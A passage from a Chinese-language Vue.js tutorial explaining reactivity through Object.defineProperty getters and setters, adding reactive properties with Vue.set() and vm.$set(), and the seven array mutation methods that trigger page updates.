<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">x</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">y</span><span class="o">:</span> <span class="mi">1000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 创建监视者实例对象，用于监视data中属性的变化
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">obs</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Observer</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 模拟Vue实例对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">vm</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span> <span class="o">=</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">obs</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">Observer</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 汇总对象中所有的属性形成一个数组
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">keys</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 遍历
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">keys</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">key</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nx">set</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> 被修改`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;解析模板，生成虚拟DOM&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;......&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Vue通过递归将<code>data</code>中所有的对象及其属性通过<code>Object.defineProperty()</code>的方式设置了Getter和Setter。通过<code>Object.defineProperty()</code>添加Getter和Setter来进行响应式处理的动作叫做<strong>数据劫持</strong>。</p>
<blockquote>
<p>数组中的对象仅会对它们的属性进行响应式处理，而数组中的元素是没有Getter和Setter的（没有进行响应式处理）。</p>
</blockquote>
</li>
<li>
<p>将加工完成的<code>data</code>赋给Vue示例的<code>_data</code>属性。即<code>vm._data = data</code>。</p>
</li>
</ol>
<hr>
<h1 id="添加新的响应式数据" data-numberify>添加新的响应式数据<a class="anchor ms-1" href="#添加新的响应式数据"></a></h1>
<p>例如页面中存在需要后续添加的数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{user.name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>性别：{{user.sex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>年龄：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>真实年龄：{{user.age.rAge}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>对外年龄：{{user.age.sAge}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>好友：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(friend, index) in user.friends&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;index&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{friend.name}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{friend.age}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// sex: &#39;男&#39;,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">age</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">rAge</span><span class="o">:</span> <span class="mi">40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">sAge</span><span class="o">:</span> <span class="mi">29</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nx">friends</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;李四&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">35</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;王五&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">36</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>这部分后续添加的数据（如上例中的<code>user.sex</code>），直接为其赋值（<code>vm._data.user = '男'</code>）并不能让页面产生改变。这是因为在Vue实例中，后续添加的数据Vue并不会自动帮它们进行响应式数据处理（即通过<code>Object.defineProperty()</code>添加Getter和Setter）。</p>
<p>为了解决这些问题，Vue提供了一个<code>Vue.set()</code>方法来为Vue实例或Vue组件实例中的数据对象添加新的响应式数据。<code>Vue.set()</code>方法的参数如下：</p>
<ol>
<li>参数1（<code>target</code>）：要添加属性的对象。</li>
<li>参数2（<code>key</code>）：要为<code>target</code>添加的属性名称。</li>
<li>参数3（<code>value</code>）：要为<code>target</code>对象添加的<code>key</code>属性所赋的值。</li>
</ol>
<p>如上例，可以使用以下方式添加响应式数据<code>user.sex</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="s1">&#39;sex&#39;</span><span class="p">,</span> <span class="s1">&#39;男&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>此时页面才能进行正常的更新。</p>
<p>在Vue实例中也存在这样的方法，即<code>vm.$set()</code>方法（参数与<code>Vue.set()</code>一致）。如上例，添加响应式数据<code>user.sex</code>的另一种方式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">$set</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="s1">&#39;sex&#39;</span><span class="p">,</span> <span class="s1">&#39;男&#39;</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p><code>Vue.set()</code>和<code>vm.$set()</code>中参数<code>target</code>的前缀可以是<code>vm._data</code>也可以是<code>vm</code>这是因为在Vue实例<code>vm</code>中，Vue将<code>vm._data</code>中的一些属性交给了<code>vm</code>来代理（数据代理）。</p>
</blockquote>
<p>对上例进行修改：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;addSex&#34;</span><span class="p">&gt;</span>添加性别（默认值是男）<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{user.name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;user.sex&#34;</span><span class="p">&gt;</span>性别：{{user.sex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>年龄：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>真实年龄：{{user.age.rAge}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>对外年龄：{{user.age.sAge}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>好友：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(friend, index) in user.friends&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;index&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{friend.name}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{friend.age}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// sex: &#39;男&#39;,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">age</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">rAge</span><span class="o">:</span> <span class="mi">40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">sAge</span><span class="o">:</span> <span class="mi">29</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nx">friends</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;李四&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">35</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;王五&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">36</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">addSex</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$set</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="s1">&#39;sex&#39;</span><span class="p">,</span> <span class="s1">&#39;男&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p><code>Vue.set()</code>和<code>vm.$set()</code>的使用有一些局限性。它们在使用时不允许<code>target</code>为Vue实例对象或Vue实例对象的直接数据对象（如<code>_data</code>等，Vue组件实例对象也一样）。</p>
<p>在Vue中，后续添加的新对象，如果添加的方式满足Vue的规范，添加的元素Vue会对其进行响应式处理。</p>
</blockquote>
<hr>
<h1 id="vue-数组的修改" data-numberify>Vue 数组的修改<a class="anchor ms-1" href="#vue-数组的修改"></a></h1>
<p>在Vue中，对数组的某些修改并不会使页面发生改变。例如直接使用数组索引对元素赋值(如<code>list[0] = 0</code>)。这是因为Vue在加载和更新时并不会对数组中元素的本身作响应式处理（但是数组中对象元素的属性会做响应式处理），所以导致直接使用索引对数组元素赋值的修改并不会使页面发生改变。</p>
<p>问题演示：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{user.name}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>年龄：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>真实年龄：{{user.age.rAge}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>对外年龄：{{user.age.sAge}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>好友：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;/</span><span class="nt">tr</span><span class="p">&gt;&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">tr</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(friend, index) in user.friends&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;index&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{friend.name}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;</span>{{friend.age}}<span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>爱好：<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;(hobby, index) in user.hobbies&#34;</span> <span class="na">:key</span><span class="o">=</span><span class="s">&#34;index&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      {{hobby}}
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">age</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">rAge</span><span class="o">:</span> <span class="mi">40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">sAge</span><span class="o">:</span> <span class="mi">29</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nx">hobbies</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;唱&#39;</span><span class="p">,</span> <span class="s1">&#39;跳&#39;</span><span class="p">,</span> <span class="s1">&#39;Rap&#39;</span><span class="p">,</span> <span class="s1">&#39;篮球&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">friends</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;李四&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">35</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span><span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;王五&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">36</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在浏览器控制台中使用如下命令修改数组元素，并不会让页面更新：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">hobbies</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;唱歌&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">hobbies</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;跳舞&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">hobbies</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;打篮球&#39;</span>
</span></span></code></pre></div><p>为了解决这些问题，Vue指定了7个操作数组的方法，并承认它们的操作是对数组进行了修改，所以使用这7个方法对数组进行修改后，页面才能正常更新。Vue指定的这7个操作数组的方法分别是：</p>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>array.push()</code></td>
<td style="text-align:left">向数组的末尾添加一个或者多个元素，并返回新数组的长度</td>
</tr>
<tr>
<td style="text-align:center"><code>array.pop()</code></td>
<td style="text-align:left">删除并返回数组的最后一个元素</td>
</tr>
<tr>
<td style="text-align:center"><code>array.shift()</code></td>
<td style="text-align:left">删除并返回数组的第一个元素</td>
</tr>
<tr>
<td style="text-align:center"><code>array.unshift()</code></td>
<td style="text-align:left">向数组的开头添加一个或多个元素，并返回新数组的长度</td>
</tr>
<tr>
<td style="text-align:center"><code>array.splice()</code></td>
<td style="text-align:left">删除元素，并向数组添加新元素</td>
</tr>
<tr>
<td style="text-align:center"><code>array.sort()</code></td>
<td style="text-align:left">对数组的元素进行排序</td>
</tr>
<tr>
<td style="text-align:center"><code>array.reverse()</code></td>
<td style="text-align:left">颠倒数组中元素的顺序</td>
</tr>
</tbody>
</table>
<p>这7个方法能奏效是因为Vue对<code>Array.prototype</code>中对应的这7个方法进行了封装。</p>
<p>Vue封装的这7个方法大致上都做了以下两件事：</p>
<ol>
<li>调用<code>Array.prototype</code>中对应的原生方法。</li>
<li>数据更新引起的模板的解析和页面更改等操作。</li>
</ol>
<p>在Vue官方文档中，将这7个方法称为<u>数组的变更方法</u>。这7个方法其实是对数组变化的监测。</p>
<p>其实在Vue中修改数组也可以使用<code>Vue.set()</code>和<code>vm.$set()</code>。如上例，在控制台修改其中的数组元素：</p>
